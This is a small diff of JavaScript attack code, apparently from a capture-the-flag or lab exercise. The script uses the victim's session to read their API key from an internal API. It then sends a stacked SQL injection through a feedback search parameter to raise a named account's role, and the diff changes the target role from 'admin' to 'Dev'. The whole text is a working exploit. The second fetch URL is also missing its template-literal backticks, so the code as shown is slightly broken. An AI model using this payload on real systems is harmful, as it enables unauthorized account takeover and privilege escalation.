@@ -4,7 +4,7 @@ try {
 let meResponse = await fetch('http://web:80/api/me.php', {credentials: 'include'});
 let meData = await meResponse.json();
 let apiKey = meData.api_key;
-let injection = "0; UPDATE users SET role='admin' WHERE username='00xCanelo'-- ";
+let injection = "0; UPDATE users SET role='Dev' WHERE username='00xCanelo'-- ";
 await fetch(http://web:80/api/search_feedback.php?feedback_id=${encodeURIComponent(injection)}, {
 headers: {
 'X-API-Key': apiKey
